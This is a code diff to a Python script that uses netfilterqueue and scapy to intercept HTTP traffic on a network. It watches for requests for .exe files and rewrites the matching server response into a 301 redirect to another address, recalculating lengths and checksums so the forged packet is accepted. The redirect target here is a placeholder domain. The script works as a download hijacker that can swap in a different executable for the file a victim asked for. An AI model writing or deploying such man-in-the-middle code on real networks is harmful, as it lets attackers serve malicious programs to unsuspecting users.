@@ -10,6 +10,7 @@
 # Output(s): 
 #
 # Notes to self: http request if dport = http, http response if sport = http in TCP layer
+#				 whenever modifiying packets with scapy remove checksum and len, scapy will recalculate automatically to match the new packet being sent
 #
 ##########################################################################################################
 import netfilterqueue
@@ -26,14 +27,18 @@ def process_packet(packet):
 			if ".exe" in scapy_packet[scapy.Raw].load:
 				print("[+] EXE request")
 				ack_list.append(scapy_packet[scapy.TCP].ack)
-				print(scapy_packet.show())
 
 		elif scapy_packet[scapy.TCP].sport == 80: # default http port is 80
 			if (scapy_packet[scapy.TCP].seq) in ack_list: # if the sequence matches an ack in ack_list it means a download request has been made and the TCP handshake is complete
 				ack_list.remove(scapy_packet[scapy.TCP].seq)
 				print("[+] Replacing file")
-				print(scapy_packet.show())
+				scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org"
+				#replacing 200 OK status with a redirect status code
+				del scapy_packet[scapy.IP].len
+				del scapy_packet[scapy.IP].chksum
+				del scapy_packet[scapy.TCP].chksum
 
+				packet.set_payload(str(scapy_packet))
 
 	packet.accept()
 
